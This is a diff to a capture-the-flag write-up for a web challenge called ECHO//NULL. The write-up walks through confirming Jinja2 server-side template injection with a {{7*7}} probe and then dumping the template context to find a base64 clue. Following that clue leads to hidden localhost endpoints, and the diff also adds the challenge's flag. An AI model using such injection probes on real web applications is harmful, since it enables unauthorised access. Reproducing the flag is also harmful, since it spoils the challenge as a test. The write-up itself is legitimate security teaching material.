@@ -1,6 +1,10 @@
-# ECHO//NULL — Official Organizer Writeup
+# ECHO//NULL (Web, Medium)
 
-> **CONFIDENTIAL**: For CTF Organizers & Authors Only. Contains full solution details, exploit payloads, and flag.
+**Author:** Aryan Havkar  
+**Category:** Web Exploitation  
+**Difficulty:** Medium  
+**Vulnerability:** Server-Side Template Injection (SSTI) in Jinja2  
+**Flag Format:** `OWASP{...}`
 
 ---
 
@@ -8,9 +12,23 @@
 
 - **Name:** ECHO//NULL
 - **Category:** Web
-- **Difficulty:** Moderate
+- **Difficulty:** Medium
 - **Vulnerability:** Server-Side Template Injection (SSTI) in Jinja2
 - **Flag:** `OWASP{echoes_survive_the_shutdown}`
+
+---
+
+## Challenge Description
+
+> An abandoned archive terminal sits in degraded state ("ARCHIVE NODE 07"). The legacy renderer is active and waiting for external transmissions. Investigate the terminal and recover what survives the shutdown.
+
+---
+
+## Flag
+
+```text
+OWASP{echoes_survive_the_shutdown}
+```
 
 ---
 
@@ -26,16 +44,14 @@ The system log indicates:
 - `awaiting transmission`
 
 A form is available to submit messages via `POST /transmit`.
-![Echo-Null Homepage](Writeup_images/01-homepage.png.png)
 
 ### 2. Message Transmission & Behavior
 Submitting a normal payload such as `Hello` returns a response page:
-```
+```text
 TRANSMISSION ACCEPTED
 Hello
 ```
 The application reflects the submitted message inside the terminal viewport.
-![Normal Transmission](Writeup_images/02-normal-transmission.png.png)
 
 ### 3. Testing Template Expressions
 The log entry mentions `legacy renderer enabled`. In Python web stacks (such as Flask), user input reflection often hints at template rendering.
@@ -43,18 +59,15 @@ The log entry mentions `legacy renderer enabled`. In Python web stacks (such as 
 Submit a basic mathematical template expression:
 ```jinja2
 {{7*7}}
-
 ```
-![SSTI Test](Writeup_images/03-ssti-test.png.png)
 
 ### 4. SSTI Confirmation
 The application responds with:
-```
+```text
 TRANSMISSION ACCEPTED
 49
 ```
 Because `{{7*7}}` is evaluated to `49`, Server-Side Template Injection (SSTI) in the Jinja2 engine is confirmed.
-![Archive Note](Writeup_images/04-archive-note.png.png)
 
 ### 5. Investigating Template Context
 Instead of attempting destructive remote code execution (RCE), the objective is reconnaissance within the template context. Jinja2 exposes several built-in variables and objects that hold the active evaluation context.
@@ -73,13 +86,13 @@ or:
 ```
 
 In the resulting output, a custom context variable named `archive_note` is exposed:
-```
+```text
 archive_note: 'VGhlIG9sZCBub2RlIHN0aWxsIGFjY2VwdHMgL2FyY2hpdmUvc3RhdHVz'
 ```
-![Archive Mirror](Writeup_images/07-archive-mirror.png.png)
+
 ### 6. Decoding the Base64 Clue
 Extract the Base64-encoded string:
-```
+```text
 VGhlIG9sZCBub2RlIHN0aWxsIGFjY2VwdHMgL2FyY2hpdmUvc3RhdHVz
 ```
 
@@ -88,18 +101,18 @@ Decode it using terminal tools or Python:
 echo "VGhlIG9sZCBub2RlIHN0aWxsIGFjY2VwdHMgL2FyY2hpdmUvc3RhdHVz" | base64 -d
 ```
 Decoded message:
-```
+```text
 The old node still accepts /archive/status
 ```
 
 ### 7. Accessing the Diagnostic Endpoint
 Navigate to the hidden diagnostic endpoint:
-```
+```text
 http://127.0.0.1:5000/archive/status
 ```
 
 The terminal renders a restricted diagnostic screen:
-```
+```text
 ========================================
  ARCHIVE NODE 07
  DIAGNOSTIC STATUS
@@ -119,12 +132,12 @@ The diagnostic output reveals an archive mirror path: `node07://mirror/sector-3`
 
 ### 8. Accessing the Hidden Archive Mirror
 Based on the URI scheme `node07://mirror/sector-3` and the `/archive/status` endpoint structure, access the mirror endpoint passing `sector=3`:
-```
+```text
 http://127.0.0.1:5000/archive/mirror?sector=3
 ```
 
 Testing an invalid sector (e.g., `/archive/mirror?sector=1` or `/archive/mirror`) returns:
-```
+```text
 ========================================
  ARCHIVE ERROR
 ========================================
@@ -133,7 +146,7 @@ Sector unavailable.
 
 ### 9. Flag Recovery
 With `?sector=3`, the archive successfully recovers the stored transmission:
-```
+```text
 ========================================
  ARCHIVE RECOVERED
 ========================================
@@ -157,11 +170,11 @@ OWASP{echoes_survive_the_shutdown}
 ```
 
 The retrieved flag is:
-```
+```text
 OWASP{echoes_survive_the_shutdown}
 ```
 
----![Final Flag](Writeup_images/08-final-flag.png.png)
+---
 
 ## How to Fix the Vulnerability
 
